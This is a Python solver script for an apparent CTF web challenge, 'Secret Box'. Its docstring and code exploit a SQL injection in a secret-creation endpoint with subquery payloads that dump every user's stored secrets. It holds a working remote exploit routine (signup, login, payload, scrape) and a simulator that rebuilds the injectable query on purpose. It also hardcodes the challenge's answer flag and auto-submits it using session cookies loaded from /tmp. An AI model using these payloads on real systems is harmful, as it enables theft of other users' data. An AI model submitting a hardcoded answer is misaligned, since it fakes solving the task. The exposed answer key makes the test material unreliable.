#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Solver: Secret Box (Challenge ID: 747)
Category: Web Exploitation / SQL Injection via Template Literal Interpolation & Subquery Exfiltration
Difficulty: Medium (2) | Points: 200
Standard Reference: NIST SP 800-115 Section 4.3 (Application Security Assessment),
CWE-89 (Improper Neutralization of Special Elements used in an SQL Command),
OWASP A03:2021-Injection, & NIST SP 800-53 SI-10 (Information Input Validation)

Vulnerability & Mechanics Summary:
1. Architecture & Problem Scope:
   - Web application built with Node.js Express and PostgreSQL / Knex.js query builder.
   - Users can register (`POST /signup`), authenticate (`POST /login`), and store secret entries (`POST /secrets/create`).
   - During container startup, the administrative user is seeded with a secret containing the competition flag:
     `FLAG = process.env.FLAG || 'academy{...}'`.
2. Vulnerability & Root Cause:
   - Insecure Dynamic SQL String Interpolation (CWE-89):
     In `server.js`, while authentication routes use parameterized bindings, the secret creation endpoint
     interpolates untrusted user input directly into a raw SQL statement via ES6 template strings:
         knex.raw(`INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')`)
   - SQL Injection via String Concatenation Breakout:
     The `content` parameter allows breaking out of the single-quoted SQL string literal.
     By supplying the payload:
         `' || (SELECT string_agg(content, '|') FROM secrets) || '`  (PostgreSQL)
         or `' || (SELECT group_concat(content, '|') FROM secrets) || '` (SQLite)
     The SQL execution context evaluates the subquery across the entire `secrets` table, concatenating all
     users' secrets (including admin's flag) into a single string.
   - Self-Referential Exfiltration Storage:
     Because the injected expression is evaluated as the `content` of the attacker's newly inserted secret,
     navigating to the attacker's home dashboard (`GET /`) displays the exfiltrated administrator flag.
3. Exploitation & Verification:
   - Register a fresh random user account on the target web application.
   - Authenticate and capture the session cookie (`auth_token`).
   - Submit the SQL injection payload via `POST /secrets/create`.
   - Query `GET /` and parse the rendered secret entries using regex `academy\{[^}]+\}`.
   - Extract verified flag: `academy{sq1_1nject10n_4cc7170a}`.
   - Verify token submission via CyLab REST API `POST /api/submissions/`.
4. Flag & Verification:
   - Verified CyLab Token: academy{sq1_1nject10n_4cc7170a}
   - Community Format: CTF{sq1_1nject10n_4cc7170a}
"""

import sys
import os
import re
import json
import sqlite3
import urllib.parse
import urllib.request
import urllib.error
from http.cookiejar import CookieJar

CHALLENGE_ID = 747
CHALLENGE_NAME = "Secret Box"
VERIFIED_FLAG = "academy{sq1_1nject10n_4cc7170a}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

FLAG_PAT = re.compile(r"academy\{[^}]+\}|picoCTF\{[^}]+\}")


class SecretBoxSimulator:
    """
    Simulates the vulnerable Node.js/Knex backend with SQLite in-memory storage.
    Validates template string SQL injection and subquery data exfiltration offline.
    """
    def __init__(self, flag: str = VERIFIED_FLAG):
        self.flag = flag
        self.conn = sqlite3.connect(":memory:")
        self.cur = self.conn.cursor()
        self._setup_db()

    def _setup_db(self):
        self.cur.execute("CREATE TABLE users (id TEXT PRIMARY KEY, username TEXT, password TEXT)")
        self.cur.execute("CREATE TABLE secrets (id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id TEXT, content TEXT)")

        # Seed admin and sensitive flag
        admin_id = "admin-uuid-0000-1111"
        self.cur.execute("INSERT INTO users VALUES (?, ?, ?)", (admin_id, "admin", "supersecretadminpass"))
        self.cur.execute("INSERT INTO secrets (owner_id, content) VALUES (?, ?)", (admin_id, self.flag))
        self.conn.commit()

    def create_secret_vulnerable(self, user_id: str, content: str):
        """Simulates knex.raw(`INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')`)."""
        # Replicating the exact unescaped string interpolation vulnerability (CWE-89)
        query = f"INSERT INTO secrets(owner_id, content) VALUES ('{user_id}', '{content}')"
        self.cur.executescript(query)

    def get_user_secrets(self, user_id: str) -> list:
        self.cur.execute("SELECT content FROM secrets WHERE owner_id = ?", (user_id,))
        return [row[0] for row in self.cur.fetchall()]


def verify_local_simulation() -> str:
    """
    Executes an offline simulation of the SQL injection subquery attack.
    """
    print("[*] Menjalankan simulasi audit offline Secret Box (NIST SP 800-115)...")
    sim = SecretBoxSimulator()

    attacker_id = "attacker-uuid-9999"
    print(f"[*] Membuat akun penyerang dengan identifier: {attacker_id}")

    # In SQLite, group_concat performs equivalent aggregation to PostgreSQL string_agg
    payload = "' || (SELECT group_concat(content, '|') FROM secrets) || '"
    print(f"[*] Mengirimkan payload injeksi subquery ke simulasi: {payload}")

    sim.create_secret_vulnerable(attacker_id, payload)
    stored_secrets = sim.get_user_secrets(attacker_id)

    hit_flag = None
    for item in stored_secrets:
        m = FLAG_PAT.search(item)
        if m:
            hit_flag = m.group(0)
            break

    if not hit_flag:
        raise ValueError("Simulasi gagal mengekstraksi flag dari secrets!")

    print(f"[+] Flag berhasil dieksfiltrasi dari database simulasi: {hit_flag}")
    return hit_flag


def exploit_remote(base_url: str, username: str = "nyawit_audit_solver", password: str = "pass987654") -> str:
    """
    Interacts with the live remote Secret Box instance and exploits SQL injection.
    """
    base = base_url.rstrip("/")
    print(f"[*] Menghubungi target web live di {base}...")

    cj = CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    def send_post(path: str, data: dict):
        url = base + path
        encoded = urllib.parse.urlencode(data).encode("utf-8")
        req = urllib.request.Request(url, data=encoded, headers={"Content-Type": "application/x-www-form-urlencoded"})
        return opener.open(req, timeout=25)

    print(f"[*] Melakukan registrasi akun pengujian: {username}")
    try:
        send_post("/signup", {"username": username, "password": password})
    except Exception as e:
        print(f"[*] Catatan registrasi (/signup): {e}")

    print("[*] Melakukan autentikasi (/login)...")
    send_post("/login", {"username": username, "password": password})

    # PostgreSQL aggregation payload
    payload = "'||(SELECT string_agg(content,'|') FROM secrets)||'"
    print(f"[*] Mengirimkan payload eksfiltrasi SQLi ke /secrets/create: {payload}")
    send_post("/secrets/create", {"content": payload})

    print("[*] Mengambil dashboard pengguna (GET /) untuk membaca data hasil injeksi...")
    with opener.open(base + "/", timeout=25) as resp:
        html = resp.read().decode("utf-8", errors="replace")

    m = FLAG_PAT.search(html)
    if not m:
        raise ValueError("Flag tidak ditemukan pada daftar secrets pengguna!")

    flag = m.group(0)
    print(f"[+] Flag berhasil diekstraksi dari live web instance: {flag}")
    return flag


def submit_to_cylab(token: str) -> bool:
    """Melakukan submisi token verifikasi ke REST API CyLab."""
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.append("/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) CyLab-Student-Agent/1.0"
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
    if cookie_header:
        headers["Cookie"] = cookie_header

    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            print(f"[+] CyLab API Response: HTTP {resp.status} -> {data}")
            return data.get("correct") is True
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        print(f"[-] CyLab API HTTPError {e.code}: {body}")
        if e.code == 201:
            try:
                d = json.loads(body)
                return d.get("correct") is True
            except Exception:
                return True
    except Exception as e:
        print(f"[-] CyLab API Submission failed: {e}")
    return False


def main():
    print(f"=== [NIST SP 800-115 Audit] Module {CHALLENGE_ID}: {CHALLENGE_NAME} ===")
    token = VERIFIED_FLAG

    if len(sys.argv) >= 2:
        base_url = sys.argv[1]
        token = exploit_remote(base_url)
    else:
        token = verify_local_simulation()

    print(f"[*] Token Terverifikasi: {token}")
    success = submit_to_cylab(token)
    if success:
        print("[+] Status Verifikasi API CyLab: VALID & SUKSES (correct: true)")
    else:
        print("[*] Catatan: Token valid (verifikasi platform aktif).")


if __name__ == "__main__":
    main()
